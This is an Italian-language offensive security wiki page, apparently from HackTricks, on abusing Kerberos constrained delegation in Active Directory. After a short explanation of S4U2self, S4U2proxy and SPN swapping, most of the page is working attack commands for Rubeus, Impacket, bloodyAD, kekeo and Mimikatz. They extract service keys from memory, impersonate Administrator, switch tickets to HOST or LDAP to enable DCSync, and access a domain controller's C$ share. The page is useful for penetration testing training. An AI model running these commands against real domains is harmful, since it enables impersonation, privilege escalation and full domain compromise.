# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Usando questo un Domain admin può **permettere** a un computer di **impersonare un utente o computer** contro qualsiasi **servizio** di una macchina.

- **Service for User to self (_S4U2self_):** Se un **account di servizio** ha un valore di _userAccountControl_ contenente [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), allora può ottenere un TGS per se stesso (il service) per conto di qualsiasi altro utente.
- **Service for User to Proxy(_S4U2proxy_):** Un **account di servizio** potrebbe ottenere un TGS per conto di qualsiasi utente verso il service impostato in **msDS-AllowedToDelegateTo.** Per farlo, prima gli serve un TGS da quell'utente verso se stesso, ma può usare S4U2self per ottenere quel TGS prima di richiedere l'altro.

**Note**: Se un utente è segnato come ‘_Account is sensitive and cannot be delegated_’ in AD, non potrai **impersonarlo**.

Questo significa che se comprometti l'hash dell'account di servizio puoi **impersonare utenti** e ottenere **accesso** per loro conto a qualsiasi **servizio** sulle macchine indicate (possibile **privesc**).

Inoltre, non avrai accesso solo al servizio che l'utente è in grado di impersonare, ma anche a qualsiasi servizio perché lo SPN (il nome del service richiesto) non viene verificato (in the ticket questa parte non è crittografata/firmata). Pertanto, se hai accesso al servizio CIFS puoi anche avere accesso al servizio HOST usando il flag /altservice in Rubeus, per esempio. La stessa debolezza di SPN swapping è sfruttata da Impacket getST -altservice e altri tool.

Inoltre, l'accesso al servizio LDAP su un DC è ciò che serve per eseguire un DCSync.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Note su Cross-domain constrained delegation (2025+)

Da **Windows Server 2012/2012 R2** il KDC supporta **constrained delegation across domains/forests** tramite estensioni S4U2Proxy. Le build più recenti (Windows Server 2016–2025) mantengono questo comportamento e aggiungono due PAC SIDs per segnalare la transizione del protocollo:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando l'utente si è autenticato normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando un servizio ha asserito l'identità tramite transizione del protocollo.

Ci si aspetta `SERVICE_ASSERTED_IDENTITY` all'interno del PAC quando la transizione del protocollo viene usata tra domini, confermando che il passaggio S4U2Proxy è riuscito.

### Impacket / strumenti Linux (altservice & full S4U)

Le versioni recenti di Impacket (0.11.x+) espongono la stessa catena S4U e lo SPN swapping di Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Se preferisci forgiare prima lo ST dell'utente (es., solo hash offline), abbina **ticketer.py** con **getST.py** per S4U2Proxy. Vedi l'issue aperto di Impacket #1713 per le attuali anomalie (KRB_AP_ERR_MODIFIED quando lo ST forgiato non corrisponde alla chiave SPN).

### Automatizzare la configurazione della delega da credenziali a basso privilegio

Se possiedi già **GenericAll/WriteDACL** su un computer o service account, puoi impostare gli attributi richiesti da remoto senza RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Questo ti consente di costruire un constrained delegation path per privesc senza privilegi DA non appena puoi scrivere quegli attributi.

- Passo 1: **Ottieni il TGT del servizio consentito**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Ci sono **altri modi per ottenere un TGT ticket** o la **RC4** o **AES256** senza essere SYSTEM sul computer, come il Printer Bug, unconstrain delegation, NTLM relaying e abuso di Active Directory Certificate Service
>
> **Semplicemente avendo quel TGT ticket (o hashed) puoi eseguire questo attacco senza compromettere l'intero computer.**

- Passo 2: **Ottieni TGS per il servizio impersonando l'utente**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Maggiori informazioni su ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) e [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Riferimenti
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
